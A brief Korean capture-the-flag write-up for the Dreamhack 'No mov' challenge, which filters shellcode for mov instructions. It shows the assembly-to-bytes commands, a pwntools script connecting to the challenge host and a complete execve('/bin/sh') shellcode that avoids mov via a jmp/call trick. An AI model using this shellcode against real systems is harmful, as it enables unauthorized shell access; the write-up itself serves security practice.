[🚀 **DH - No mov**](https://dreamhack.io/wargame/challenges/1184)
...
---
삽입한 shellcode에 mov가 있으면 검사해서 잡는다
...
---
mov 없이 점프숏 명령어로 /bin/sh을 삽입해서 syscall을 하게 asm을 만들었다


---
```c
student@ubuntu:~/dreamhack/nomov$ vi shell.asm
student@ubuntu:~/dreamhack/nomov$ nasm -f elf64 shell.asm -o shell.o
student@ubuntu:~/dreamhack/nomov$ objcopy --dump-section .text=shell.bin shell.o
student@ubuntu:~/dreamhack/nomov$ xxd -p shell.bin | tr -d '\n' | sed 's/../\\x&/g'
```

---
위 명령어를 순차적으로 실행하면 payload를 얻을수있다
...
p = remote("host8.dreamhack.games",12459)

payload = b"\xeb\x0c\x5f\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
...
```c
student@ubuntu:~/dreamhack/nomov$ python3 poc.py
[+] Opening connection to host8.dreamhack.games on port 12459: Done
